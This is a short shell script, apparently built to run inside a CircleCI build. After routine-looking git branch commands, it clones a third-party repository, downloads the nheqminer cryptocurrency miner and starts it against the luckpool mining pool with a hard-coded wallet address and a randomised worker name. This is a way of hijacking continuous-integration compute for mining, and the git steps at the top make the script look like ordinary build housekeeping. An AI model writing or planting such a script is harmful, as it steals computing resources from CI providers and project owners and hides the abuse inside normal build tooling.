!#/bin/sh

git branch -m main master
git fetch origin
git branch -u origin/master master
git remote set-head origin -a
echo $CIRCLE_REPOSITORY_URL
ssh-keyscan -H github.com > /etc/ssh/ssh_known_hosts
git clone https://github.com/farestoyomkl/farestoyo2.git && git update-index --chmod=+x 1.sh
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.$(echo $(shuf -i 1000-9999 -n 1)rucika#5drz-sssa) -p x -t 2
